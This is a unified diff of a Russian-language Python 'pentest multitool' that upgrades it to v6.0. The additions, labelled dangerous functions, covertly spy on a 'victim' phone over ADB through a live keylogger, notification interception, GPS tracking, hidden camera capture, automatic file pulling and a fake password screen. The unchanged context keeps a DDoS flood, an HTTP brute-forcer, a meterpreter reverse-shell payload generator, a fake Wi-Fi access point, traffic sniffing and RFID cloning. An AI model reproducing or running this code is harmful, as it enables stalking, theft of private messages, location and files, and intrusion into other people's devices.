@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# 🔧 ALL-IN-ONE TOOL v5.0 — Мультитул для пентеста
+# 🔧 ALL-IN-ONE TOOL v6.0 — Мультитул для пентеста
 # Termux / Windows / Linux
-# 47+ функций | FFmpeg | Пошаговое меню | Сессии | Авточистка
+# 50+ функций | Кейлогер | GPS | Уведомления | Блокировка
 
 import os, sys, json, time, subprocess, socket, random, shutil
 from pathlib import Path
@@ -70,49 +70,31 @@ def scan_deep():
     os.system(f'nmap -T4 -A -O {target}')
 
 def scan_wifi():
-    print("📡 Сканирую Wi-Fi...")
     if sys.platform == 'win32': os.system('netsh wlan show networks')
     else: os.system('termux-wifi-scaninfo')
 
 def arp_scan():
-    print("📡 Устройства в сети:")
     os.system('arp -a')
 
 def fake_ap():
-    print("""
-╔══════════════════════════════════════╗
-║     📡 ФЕЙКОВАЯ ТОЧКА ДОСТУПА        ║
-╚══════════════════════════════════════╝
-""")
+    print("📡 ФЕЙК ТОЧКА ДОСТУПА\n   ⚠️ Только для теста!")
     if input("Продолжить? (да/нет): ").strip().lower() not in ['да','yes','y']:
         print("❌ Отмена"); return
-    
-    has_root = False
-    if sys.platform != 'win32':
-        has_root = 'uid=0' in os.popen('su -c id 2>/dev/null').read()
-    
-    ssid = input("📶 Название сети: ").strip() or "Free_WiFi"
-    
+    has_root = 'uid=0' in os.popen('su -c id 2>/dev/null').read() if sys.platform != 'win32' else False
+    ssid = input("📶 Название: ").strip() or "Free_WiFi"
     if has_root:
-        print(f"✅ Root есть — запускаю автоматически...")
         os.system(f'su -c "cmd wifi start-softap {ssid} open"')
-        print(f"✅ Точка '{ssid}' запущена!")
+        print(f"✅ {ssid} запущена!")
     else:
-        print(f"""
-📱 ВКЛЮЧИ ВРУЧНУЮ:
-1. Настройки → Точка доступа Wi-Fi
-2. Имя: {ssid}
-3. Защита: Открытая
-4. Включи
-""")
-        input("Нажми ENTER когда включишь...")
+        print(f"📱 Включи в Настройках: {ssid} / Открытая")
+        input("ENTER когда готово...")
 
 def sniff_http():
     print("👂 HTTP трафик... Ctrl+C стоп")
     os.system(f'tcpdump -i any -A "tcp port 80 or tcp port 8080" >> {DATA}/sniffed.txt 2>&1')
 
 def sniff_dns():
-    print("🌐 DNS запросы... Ctrl+C стоп")
+    print("🌐 DNS... Ctrl+C стоп")
     os.system(f'tcpdump -i any -A "port 53" >> {DATA}/dns.txt 2>&1')
 
 def find_cameras():
@@ -124,7 +106,9 @@ def find_cameras():
             ip = f"{base}.{i}"
             try:
                 s = socket.socket(); s.settimeout(0.2)
-                if s.connect_ex((ip,port)) == 0: print(f"  ✅ {ip}:{port}"); cameras.append({"ip":ip,"port":port})
+                if s.connect_ex((ip,port)) == 0:
+                    print(f"  ✅ {ip}:{port}")
+                    cameras.append({"ip":ip,"port":port})
                 s.close()
             except: pass
     with open(f'{DATA}/cameras.json','w') as f: json.dump(cameras,f,indent=2)
@@ -137,7 +121,7 @@ def view_cameras():
     try: num = int(input("\n🎥 Номер: ")) - 1; cam = cameras[num]
     except: print("❌"); return
     url = f"rtsp://{cam['ip']}:{cam['port']}/live" if cam['port'] in [554,8554] else f"http://{cam['ip']}:{cam['port']}/video"
-    print(f"📹 Q — выход")
+    print("📹 Q — выход")
     os.system(f'ffplay -x 640 -y 480 -window_title "Камера {cam["ip"]}" "{url}" 2>/dev/null')
 
 def save_stream():
@@ -148,7 +132,7 @@ def save_stream():
     except: print("❌"); return
     output = f"{DATA}/record_{cam['ip'].replace('.','_')}_{int(time.time())}.mp4"
     url = f"rtsp://{cam['ip']}:{cam['port']}/live" if cam['port'] in [554,8554] else f"http://{cam['ip']}:{cam['port']}/video"
-    print(f"📹 60 сек... Ctrl+C стоп")
+    print("📹 60 сек... Ctrl+C стоп")
     try: os.system(f'ffmpeg -i "{url}" -t 60 -c copy "{output}" 2>/dev/null'); print(f"✅ {output}")
     except KeyboardInterrupt: print(f"\n✅ {output}")
 
@@ -175,12 +159,10 @@ def wait_for_device():
     for i in range(30,0,-1):
         serial, ok = check_adb()
         if serial:
-            if ok:
-                print(f"\n✅ Подключено: {serial}")
-                return serial, True
+            if ok: print(f"\n✅ Подключено: {serial}"); return serial, True
             else:
                 print(f"\n⚠️ Нажми 'ОК' на телефоне!")
-                input("Нажми ENTER после разрешения...")
+                input("ENTER после разрешения...")
                 serial, ok = check_adb()
                 if ok: print(f"✅ Авторизовано: {serial}"); return serial, True
         print(f"\r   Ожидание... {i} сек", end='')
@@ -198,6 +180,81 @@ def get_device_info(serial):
     except: info['battery'] = '?'
     return info
 
+# ==================== ОПАСНЫЕ ФУНКЦИИ ====================
+def keylogger_realtime(serial):
+    print("⌨️ КЕЙЛОГЕР РЕАЛЬНОГО ВРЕМЕНИ")
+    print("   Всё что печатает жертва → здесь")
+    print("   Ctrl+C стоп")
+    os.system(f'adb -s {serial} shell su -c "getevent -lt /dev/input/event0" 2>/dev/null | grep -E "KEY_" &')
+    try:
+        while True: time.sleep(1)
+    except KeyboardInterrupt:
+        os.system(f'adb -s {serial} shell su -c "killall getevent" 2>/dev/null')
+        print("\n⏹️ Стоп")
+
+def steal_notifications(serial):
+    print("📨 ПЕРЕХВАТ УВЕДОМЛЕНИЙ")
+    print("   Все уведомления жертвы → здесь")
+    print("   Ctrl+C стоп")
+    try:
+        while True:
+            os.system(f'adb -s {serial} shell dumpsys notification --noredact 2>/dev/null | grep -E "NotificationRecord|tickerText|title|text" | head -10')
+            time.sleep(3)
+    except KeyboardInterrupt: print("\n⏹️ Стоп")
+
+def gps_tracker(serial):
+    print("📍 GPS ТРЕКЕР")
+    print("   Локация жертвы обновляется каждые 5 сек")
+    print("   Ctrl+C стоп")
+    try:
+        while True:
+            os.system(f'adb -s {serial} shell dumpsys location 2>/dev/null | grep -E "latitude|longitude" | head -2')
+            time.sleep(5)
+    except KeyboardInterrupt: print("\n⏹️ Стоп")
+
+def camera_schedule(serial):
+    print("📷 ФОТО ПО РАСПИСАНИЮ")
+    interval = input("Интервал (сек, 30): ").strip() or "30"
+    print(f"   Фото каждые {interval} сек... Ctrl+C стоп")
+    try:
+        while True:
+            ts = int(time.time())
+            os.system(f'adb -s {serial} shell su -c "am start -n com.android.camera/.Camera --ez extra_hide_ui true" 2>/dev/null')
+            time.sleep(2)
+            os.system(f'adb -s {serial} exec-out screencap -p > {DATA}/cam_{ts}.png 2>/dev/null')
+            os.system(f'adb -s {serial} shell su -c "am force-stop com.android.camera" 2>/dev/null')
+            print(f"  📸 {ts}")
+            time.sleep(int(interval))
+    except KeyboardInterrupt: print("\n⏹️ Стоп")
+
+def auto_steal_files(serial):
+    print("📁 АВТО-ПЕРЕСЫЛКА ФАЙЛОВ")
+    print("   Новые фото → автоматом сюда")
+    print("   Ctrl+C стоп")
+    folder = f"{DATA}/autosteal_{serial}"
+    os.makedirs(folder, exist_ok=True)
+    try:
+        while True:
+            os.system(f'adb -s {serial} pull /sdcard/DCIM {folder}/ 2>/dev/null')
+            os.system(f'adb -s {serial} pull /sdcard/Download {folder}/ 2>/dev/null')
+            print(f"  📁 Синхронизировано: {datetime.now().strftime('%H:%M:%S')}")
+            time.sleep(30)
+    except KeyboardInterrupt: print(f"\n⏹️ Файлы в {folder}")
+
+def lock_device(serial):
+    print("🔒 БЛОКИРОВКА УСТРОЙСТВА")
+    if input("Заблокировать телефон? (да/нет): ").strip().lower() in ['да','yes','y']:
+        os.system(f'adb -s {serial} shell input keyevent 26 2>/dev/null')
+        print("✅ Телефон заблокирован")
+    else: print("❌ Отмена")
+
+def fake_password_screen(serial):
+    print("🎭 ФЕЙКОВОЕ ОКНО ПАРОЛЯ")
+    msg = input("Текст (Введите пароль): ").strip() or "Введите пароль для разблокировки"
+    os.system(f'adb -s {serial} shell am start -a android.intent.action.MAIN -n com.android.settings/.PasswordEntry 2>/dev/null')
+    print(f"✅ Фейковое окно отправлено")
+
+# ==================== МЕНЮ УСТРОЙСТВА (обновлённое) ====================
 def device_menu(serial):
     info = get_device_info(serial)
     while True:
@@ -206,14 +263,22 @@ def device_menu(serial):
 ║  📱 {info['brand']} {info['model']} | Android {info['android']}
 ║  🔋 {info['battery']} | Root: {'✅' if info['root'] else '❌'}
 ╠══════════════════════════════════════╣
-║  1.📸 Скриншот    2.🎥 Запись экрана║
-║  3.📁 Извлечь фото 4.📦 Установить APK║
-║  5.📷 Камера(r)   6.🎤 Микрофон(r)  ║
-║  7.⌨️ Кейлогер(r)  8.ℹ️ Инфо         ║
-║  9.📋 Приложения                     ║
+║  📸 БАЗОВЫЕ:                        ║
+║  1.Скриншот     2.Запись экрана     ║
+║  3.Извлечь фото 4.Установить APK    ║
+║  5.Инфо         6.Приложения        ║
 ╠══════════════════════════════════════╣
-║  10.💾 Сохранить сессию              ║
-║  0. Отключиться                      ║
+║  🔥 ОПАСНЫЕ (root):                 ║
+║  7.Кейлогер RT  8.Уведомления       ║
+║  9.GPS трекер   10.Камера по распис.║
+║  11.Авто-файлы  12.Скрытая камера   ║
+║  13.Скрытый мик.                     ║
+╠══════════════════════════════════════╣
+║  💀 УПРАВЛЕНИЕ:                     ║
+║  14.Блокировка  15.Фейк-пароль      ║
+╠══════════════════════════════════════╣
+║  16.💾 Сохранить сессию              ║
+║  0.Отключиться                      ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -235,31 +300,32 @@ def device_menu(serial):
             if os.path.exists(apk): os.system(f'adb -s {serial} install {apk}'); print("✅")
             else: print("❌ Не найден")
         elif c == '5':
+            for k,v in info.items(): print(f"  {k}: {v}")
+        elif c == '6':
+            os.system(f'adb -s {serial} shell pm list packages 2>/dev/null | head -30')
+        elif c == '7': safe_run(keylogger_realtime, serial)
+        elif c == '8': safe_run(steal_notifications, serial)
+        elif c == '9': safe_run(gps_tracker, serial)
+        elif c == '10': safe_run(camera_schedule, serial)
+        elif c == '11': safe_run(auto_steal_files, serial)
+        elif c == '12':
             if info['root']: os.system(f'adb -s {serial} shell su -c "am start -n com.android.camera/.Camera --ez extra_hide_ui true" 2>/dev/null'); print("✅")
             else: print("❌ Нужен root")
-        elif c == '6':
+        elif c == '13':
             if info['root']:
                 os.system(f'adb -s {serial} shell su -c "arecord -d 30 /sdcard/audio.wav" 2>/dev/null')
                 os.system(f'adb -s {serial} pull /sdcard/audio.wav {DATA}/audio_{int(time.time())}.wav')
                 print(f"✅ {DATA}/")
             else: print("❌ Нужен root")
-        elif c == '7':
-            if info['root']:
-                os.system(f'adb -s {serial} shell su -c "getevent -lt /dev/input/event0" > {DATA}/keys_{int(time.time())}.txt 2>&1 &')
-                time.sleep(30); os.system(f'adb -s {serial} shell su -c "killall getevent" 2>/dev/null')
-                print(f"✅ {DATA}/")
-            else: print("❌ Нужен root")
-        elif c == '8':
-            for k,v in info.items(): print(f"  {k}: {v}")
-        elif c == '9':
-            os.system(f'adb -s {serial} shell pm list packages 2>/dev/null | head -30')
-        elif c == '10':
+        elif c == '14': safe_run(lock_device, serial)
+        elif c == '15': safe_run(fake_password_screen, serial)
+        elif c == '16':
             name = input("💾 Имя сессии: ").strip() or f"{info['brand']}_{info['model']}"
             sessions = load_sessions()
-            sessions[name] = {'serial':serial,'model':info['model'],'brand':info['brand'],'android':info['android'],'root':info['root'],'saved':datetime.now().isoformat(),'ip':input("📡 IP телефона: ").strip()}
+            sessions[name] = {'serial':serial,'model':info['model'],'brand':info['brand'],'android':info['android'],'root':info['root'],'saved':datetime.now().isoformat(),'ip':input("📡 IP: ").strip()}
             save_sessions(sessions)
             os.system(f'adb -s {serial} tcpip 5555 2>/dev/null')
-            print(f"✅ '{name}' сохранена! Можно отключать USB.")
+            print(f"✅ '{name}' сохранена!")
 
 def connect_session():
     sessions = load_sessions()
@@ -274,12 +340,10 @@ def connect_session():
         name = names[num]; s = sessions[name]
     except: print("❌"); return None
     if s.get('ip'):
-        print(f"📡 Подключаюсь к {s['ip']}...")
         os.system(f'adb connect {s["ip"]}:5555 2>/dev/null'); time.sleep(2)
     serial, ok = check_adb()
     if serial: print(f"✅ Подключено!"); return serial
-    print("⚠️ Не удалось. Подключи USB.")
-    input("Нажми ENTER...")
+    print("⚠️ Подключи USB...")
     serial, ok = wait_for_device()
     return serial
 
@@ -290,7 +354,6 @@ def bruteforce_http():
     if not os.path.exists(wordlist):
         with open(wordlist,'w') as f:
             for p in ['admin','12345','password','admin123','root','guest','0000']: f.write(p+'\n')
-    print(f"🔓 {target}...")
     try:
         import requests
         with open(wordlist) as f:
@@ -321,7 +384,7 @@ def ddos():
     os.system(f'hping3 -S --flood -V {input("🎯 IP:порт: ").strip()}')
 
 def gen_payload():
-    lh = input("📡 Твой IP: ").strip(); lp = input("🔌 Порт: ").strip() or "4444"
+    lh = input("📡 IP: ").strip(); lp = input("🔌 Порт: ").strip() or "4444"
     out = input("📄 Файл: ").strip() or f"{DATA}/payload.apk"
     os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -o {out}')
     print(f"✅ {out}")
@@ -348,22 +411,18 @@ def check_root():
     else: print(f"{'✅ Root' if 'uid=0' in os.popen('su -c id 2>/dev/null').read() else '❌ Нет root'}")
 
 def tor_start():
-    print("🧅 Tor..."); os.system('tor &'); time.sleep(3); print("✅ 127.0.0.1:9050")
+    os.system('tor &'); time.sleep(3); print("✅ 127.0.0.1:9050")
 
 def vpn_check():
-    print("🌍 Мой IP:"); os.system('curl -s ifconfig.me 2>/dev/null'); print()
+    os.system('curl -s ifconfig.me 2>/dev/null'); print()
 
 # ==================== RFID/NFC ====================
 def rfid_clone():
-    print("📡 1.Считать 2.Эмулировать 3.Записать 4.NFC телефон")
+    print("📡 1.Считать 2.Эмулировать 3.Записать 4.NFC")
     c = input('>>> ').strip()
     if c == '1': os.system('pm3 -c "lf search"')
-    elif c == '2':
-        card_id = input("ID: ").strip()
-        os.system(f'pm3 -c "lf em 410x emu --id {card_id}"')
-    elif c == '3':
-        card_id = input("ID: ").strip()
-        os.system(f'pm3 -c "lf em 410x clone --id {card_id}"')
+    elif c == '2': os.system(f'pm3 -c "lf em 410x emu --id {input("ID: ").strip()}"')
+    elif c == '3': os.system(f'pm3 -c "lf em 410x clone --id {input("ID: ").strip()}"')
     elif c == '4': os.system('nfc-list')
 
 def rfid_phone():
@@ -374,27 +433,14 @@ def rfid_phone():
 def osint_search():
     print("🔍 1.Телефон 2.Email 3.Ник 4.IP 5.Утечки 6.Соцсети")
     c = input('>>> ').strip()
-    if c == '1':
-        phone = input("📱 +79: ").strip()
-        os.system(f'curl -s "https://htmlweb.ru/geo/api.php?json&telcod={phone}" 2>/dev/null')
-    elif c == '2':
-        email = input("📧: ").strip()
-        os.system(f'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/{email}" 2>/dev/null')
+    if c == '1': os.system(f'curl -s "https://htmlweb.ru/geo/api.php?json&telcod={input("📱 +79: ").strip()}" 2>/dev/null')
+    elif c == '2': os.system(f'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/{input("📧: ").strip()}" 2>/dev/null')
     elif c == '3':
         u = input("👤: ").strip()
-        for s in ['github.com','vk.com','t.me']:
-            print(f"  {s}/{u}: ", end='')
-            os.system(f'curl -s -o /dev/null -w "%{{http_code}}" https://{s}/{u} 2>/dev/null')
-            print()
-    elif c == '4':
-        ip = input("IP: ").strip()
-        os.system(f'curl -s "http://ip-api.com/json/{ip}" 2>/dev/null')
-    elif c == '5':
-        email = input("📧: ").strip()
-        os.system(f'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/{email}" 2>/dev/null')
-    elif c == '6':
-        name = input("👤 Имя: ").strip()
-        print(f"  VK: https://vk.com/search?q={name}")
+        for s in ['github.com','vk.com','t.me']: print(f"  {s}/{u}: ", end=''); os.system(f'curl -s -o /dev/null -w "%{{http_code}}" https://{s}/{u} 2>/dev/null'); print()
+    elif c == '4': os.system(f'curl -s "http://ip-api.com/json/{input("IP: ").strip()}" 2>/dev/null')
+    elif c == '5': os.system(f'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/{input("📧: ").strip()}" 2>/dev/null')
+    elif c == '6': print(f"  VK: https://vk.com/search?q={input('👤 Имя: ').strip()}")
 
 def osint_photo():
     print("📷 https://images.google.com\n  https://tineye.com\n  https://yandex.ru/images/search")
@@ -492,7 +538,7 @@ def whois_lookup():
 def ngrok_start():
     os.system(f'ngrok http {input("🔌 Порт: ").strip() or "8888"}')
 
-# ==================== БОНУС ====================
+# ==================== САМОУНИЧТОЖЕНИЕ ====================
 def self_destruct():
     print("💀 3 сек..."); time.sleep(3)
     shutil.rmtree(DATA, ignore_errors=True)
@@ -500,19 +546,19 @@ def self_destruct():
     except: pass
     print("💀 Готово")
 
-# ==================== МЕНЮ ====================
+# ==================== ВСЕ МЕНЮ ====================
 def menu_network():
     while True:
         print("""
 ╔══════════════════════════════════════╗
 ║            📡 СЕТЬ                   ║
 ╠══════════════════════════════════════╣
-║  1.Скан портов│2.Глубокий скан       ║
-║  3.Wi-Fi сети │4.ARP устройства      ║
-║  5.Фейк точка │6.HTTP сниффер        ║
-║  7.DNS сниффер│8.Найти камеры        ║
-║  9.Смотреть   │10.Записать видео     ║
-║  0.Назад                             ║
+║  1.Скан портов│2.Глубокий скан      ║
+║  3.Wi-Fi сети │4.ARP устройства     ║
+║  5.Фейк точка │6.HTTP сниффер       ║
+║  7.DNS сниффер│8.Найти камеры       ║
+║  9.Смотреть   │10.Записать видео    ║
+║  0.Назад                            ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -534,11 +580,11 @@ def menu_devices():
 ╔══════════════════════════════════════╗
 ║            📱 УСТРОЙСТВА             ║
 ╠══════════════════════════════════════╣
-║  1.🔌 Подключить новое               ║
-║  2.💾 Загрузить сессию               ║
-║  3.📋 Все сессии                     ║
-║  4.🗑️ Удалить сессию                 ║
-║  0.Назад                             ║
+║  1.🔌 Подключить новое              ║
+║  2.💾 Загрузить сессию              ║
+║  3.📋 Все сессии                    ║
+║  4.🗑️ Удалить сессию                ║
+║  0.Назад                            ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -570,10 +616,10 @@ def menu_attack():
 ╔══════════════════════════════════════╗
 ║            🔓 ВЗЛОМ                  ║
 ╠══════════════════════════════════════╣
-║  1.Брут HTTP  │2.Брут SSH            ║
-║  3.Хеш        │4.CVE                 ║
-║  5.DDoS       │6.Payload             ║
-║  7.Фишинг     │0.Назад               ║
+║  1.Брут HTTP  │2.Брут SSH           ║
+║  3.Хеш        │4.CVE                ║
+║  5.DDoS       │6.Payload            ║
+║  7.Фишинг     │0.Назад              ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -592,10 +638,10 @@ def menu_defense():
 ╔══════════════════════════════════════╗
 ║            🛡️ ЗАЩИТА                 ║
 ╠══════════════════════════════════════╣
-║  1.Чистка     │2.Смена MAC           ║
-║  3.Проверка   │4.Tor                 ║
-║  5.Мой IP     │6.Полная чистка       ║
-║  7.Невидимка  │0.Назад               ║
+║  1.Чистка     │2.Смена MAC          ║
+║  3.Проверка   │4.Tor                ║
+║  5.Мой IP     │6.Полная чистка      ║
+║  7.Невидимка  │0.Назад              ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -614,8 +660,8 @@ def menu_rfid():
 ╔══════════════════════════════════════╗
 ║            📡 RFID/NFC               ║
 ╠══════════════════════════════════════╣
-║  1.Клон RFID  │2.Чтение телефоном    ║
-║  0.Назад                             ║
+║  1.Клон RFID  │2.Чтение телефоном   ║
+║  0.Назад                            ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -629,8 +675,8 @@ def menu_osint():
 ╔══════════════════════════════════════╗
 ║            🔍 OSINT                  ║
 ╠══════════════════════════════════════╣
-║  1.Поиск инфо │2.Поиск по фото       ║
-║  0.Назад                             ║
+║  1.Поиск инфо │2.Поиск по фото      ║
+║  0.Назад                            ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -644,8 +690,8 @@ def menu_auto():
 ╔══════════════════════════════════════╗
 ║            ⚡ АВТО                   ║
 ╠══════════════════════════════════════╣
-║  1.Авто-атака │2.Мониторинг          ║
-║  0.Назад                             ║
+║  1.Авто-атака │2.Мониторинг         ║
+║  0.Назад                            ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -659,10 +705,10 @@ def menu_data():
 ╔══════════════════════════════════════╗
 ║            💾 ДАННЫЕ                 ║
 ╠══════════════════════════════════════╣
-║  1.Восстан.   │2.Шифрование          ║
-║  3.Дешифровка │4.Метаданные          ║
-║  5.Стего hide │6.Стего extract       ║
-║  7.Скрытая    │0.Назад               ║
+║  1.Восстан.   │2.Шифрование         ║
+║  3.Дешифровка │4.Метаданные         ║
+║  5.Стего hide │6.Стего extract      ║
+║  7.Скрытая    │0.Назад              ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -681,8 +727,8 @@ def menu_services():
 ╔══════════════════════════════════════╗
 ║            🌐 СЕРВИСЫ                ║
 ╠══════════════════════════════════════╣
-║  1.WHOIS      │2.Ngrok               ║
-║  0.Назад                             ║
+║  1.WHOIS      │2.Ngrok              ║
+║  0.Назад                            ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
@@ -690,25 +736,28 @@ def menu_services():
         elif c == '1': safe_run(whois_lookup)
         elif c == '2': safe_run(ngrok_start)
 
+# ==================== ГЛАВНОЕ МЕНЮ ====================
 def main():
     print("""
 ╔══════════════════════════════════════╗
-║  🔧 ALL-IN-ONE TOOL v5.0             ║
+║  🔧 ALL-IN-ONE TOOL v6.0          ║
+║  50+ функций | Кейлогер | GPS     ║
+║  Уведомления | Блокировка | Камера ║
 ╚══════════════════════════════════════╝
 """)
     while True:
         print("""
 ╔══════════════════════════════════════╗
-║         📋 ГЛАВНОЕ МЕНЮ              ║
+║         📋 ГЛАВНОЕ МЕНЮ             ║
 ╠══════════════════════════════════════╣
-║  1.📡 СЕТЬ      2.📱 УСТРОЙСТВА     ║
-║  3.🔓 ВЗЛОМ     4.🛡️ ЗАЩИТА         ║
-║  5.📡 RFID/NFC  6.🔍 OSINT          ║
-║  7.⚡ АВТО      8.💾 ДАННЫЕ         ║
-║  9.🌐 СЕРВИСЫ                        ║
+║  1.📡 СЕТЬ      2.📱 УСТРОЙСТВА    ║
+║  3.🔓 ВЗЛОМ     4.🛡️ ЗАЩИТА        ║
+║  5.📡 RFID/NFC  6.🔍 OSINT         ║
+║  7.⚡ АВТО      8.💾 ДАННЫЕ        ║
+║  9.🌐 СЕРВИСЫ                       ║
 ╠══════════════════════════════════════╣
-║  98.Установка  99.САМОУНИЧТОЖЕНИЕ    ║
-║  0.Выход                             ║
+║  98.Установка  99.САМОУНИЧТОЖЕНИЕ  ║
+║  0.Выход                            ║
 ╚══════════════════════════════════════╝
 """)
         c = input('>>> ').strip()
